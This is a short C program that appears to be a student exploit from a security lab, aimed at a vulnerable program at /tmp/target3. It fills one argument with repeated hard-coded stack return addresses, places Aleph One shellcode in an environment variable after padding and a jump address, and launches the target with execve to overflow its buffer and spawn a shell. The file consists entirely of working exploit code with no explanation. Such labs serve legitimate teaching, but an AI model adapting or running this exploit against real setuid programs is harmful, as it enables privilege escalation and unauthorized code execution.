#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  
  char addrToAdd[] = "\x52\xff\xff\xbf";

  //add
  // 0xbf ff ff 7f
  char dst[24] = "\x52\xff\xff\xbf\x52\xff\xff\xbf\x52\xff\xff\xbf\x52\xff\xff\xbf\x52\xff\xff\xbf\x52\xff\xff\xbf";


  args[1] = dst+4; 
  
  args[2] = NULL;
  int sizeOfShell =  sizeof(shellcodeAlephOne) / sizeof(shellcodeAlephOne[0]);
  char att[61] = "";
  
  strcat(att, "\x41\x41\x41\x41");
  
  //add+28
  strcat(att, "\x5a\xff\xff\xbf");
  memcpy(att+8 , shellcodeAlephOne , sizeOfShell*sizeof(char));
  
  env[0] = att;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


